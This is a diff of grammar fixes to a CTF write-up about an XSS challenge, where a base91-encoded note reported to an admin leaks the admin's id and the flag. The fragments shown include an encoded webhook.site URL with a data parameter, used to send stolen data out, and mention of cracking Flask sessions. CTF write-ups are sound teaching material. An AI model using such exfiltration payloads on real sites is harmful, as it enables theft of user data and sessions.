@@ -26,7 +26,7 @@ When: **Fri, Oct. 13, 18:00 — Sun, Oct. 15, 18:00 UTC**
 
 ### TLDR - solution
 
-report a `base91` encoded _note_ to admin (**XSS** with limited character set)
+report a `base91` encoded _note_ to admin (**XSS** with a limited character set)
 
 ```python
 # btoa("https://webhook.site/your-server?data=") ==> aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=
@@ -52,7 +52,7 @@ After checking the source code and `view_encoding.html` file we can see that it'
 
 ![Alt text](/assets/images/2023-10-19/image-5.png)
 
-Inside the `app.py` file you find a flag. It's in a database, but only admin knows the id. So the idea is to prepare an encoding with some XSS, report it to the admin, and steal the id and get the flag 😉
+Inside the `app.py` file you find a flag. It's in a database, but only admin knows the id. So the idea is to prepare an encoding with some XSS, report it to the admin, steal the id and get the flag 😉
 
 ![Alt text](/assets/images/2023-10-19/image-7.png)
 
@@ -133,7 +133,7 @@ Trying with different versions of `eval` with the `no-eval` policy in place
 
 ### wrong path 3
 
-Decoding `session` using [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) and [flask-unsign-wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist). Secret is long, random so nearly impossible to crack
+Decoding `session` using [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) and [flask-unsign-wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist). Secret is long and random so nearly impossible to crack
 
 ![flask-unsign-result](/assets/images/2023-10-19/image-4.png)
 
